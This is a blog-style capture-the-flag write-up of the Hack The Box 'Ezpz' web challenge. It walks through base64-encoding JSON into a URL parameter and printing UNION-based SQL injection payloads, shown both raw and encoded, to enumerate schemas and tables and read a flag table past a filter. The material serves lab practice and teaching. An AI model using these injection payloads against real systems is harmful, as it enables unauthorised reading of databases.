---
date: 2019-05-12T19:17:18.000Z
layout: post
title: Ezpz Web Challenge Write Up From Hack The Box
subtitle: Its an easy web challenge, and we will butch it
description: >-
  We Are Always Here for Inject
image: >-
  https://i.imgur.com/XnJ1KF4.png
optimized_image: >-
  https://i.imgur.com/XnJ1KF4.png
category: web 
tags:
  - web
  - sqli
  - php
author: Dr.D3xt3r
paginate: true
---
## first Part 

i open the challenge its an error lets see what we will do .

![placeholder](https://i.imgur.com/qxWpyff.png)

lets put any value in obj : `http://docker.hackthebox.eu:30268/?obj=1`

![placeholder](https://i.imgur.com/HA1dt1Z.png)

nice its work .. lets determine 'id' property : `http://docker.hackthebox.eu:30268/?obj[id]=1`

![placeholder](https://i.imgur.com/ErPIhyx.png)

okaaai .. its take any input and decode it to base64 , so lets encode this `{"ID": "1"}`
`http://docker.hackthebox.eu:30268/?obj=eyAiSUQiOiAiMSJ9`

![placeholder](https://i.imgur.com/MkEjV2Z.png)

niiice its first part of challenge and its easy . lets see what we will do next 

## Second Part : SQLI

its being filterd by `<WAF>` so lets bypass it 

![placeholder](https://i.imgur.com/UAB6mFx.png)

I tried this payload `{"ID": "a' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT schema_name FROM information_schema.schemata)b -- a"}` 

and encode it 

`http://docker.hackthebox.eu:30268/?obj=eyJJRCI6ICJhJyBVTklPTiBTRUxFQ1QgKiBGUk9NIChTRUxFQ1QgMSlhIEpPSU4gKFNFTEVDVCBzY2hlbWFfbmFtZSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YSliIC0tIGEifQ==`

![placeholder](https://i.imgur.com/5EswifW.png)

niice its working its display > "information schema tables"

lets dipaly names of the tables : 

`<http://docker.hackthebox.eu:30268/?obj=eyJJRCI6ICJhJyBVTklPTiBTRUxFQ1QgKiBGUk9NIChTRUxFQ1QgMSlhIEpPSU4gKFNFTEVDVCB0YWJsZV9uYW1lIEZST00gbXlzcWwuaW5ub2RiX3RhYmxlX3N0YXRzKWIgLS0gYSJ9>`

![placeholder](https://i.imgur.com/PlHywd8.png)

here we go we get the flag table 

`http://docker.hackthebox.eu:30268/?obj=eyJJRCI6ICJhJ1VOSU9OIFNFTEVDVCAqIEZST00gKFNFTEVDVCAxKWEgSk9JTiAoc2VsZWN0ICogZnJvbSBGbGFnVGFibGVVbmd1ZXNzYWJsZUV6UFopYiAtLSBhIn0`

![placeholder](https://i.imgur.com/CUkmWhm.png)

GG bro its so easy .. hope its clear to u thanks for reading <3
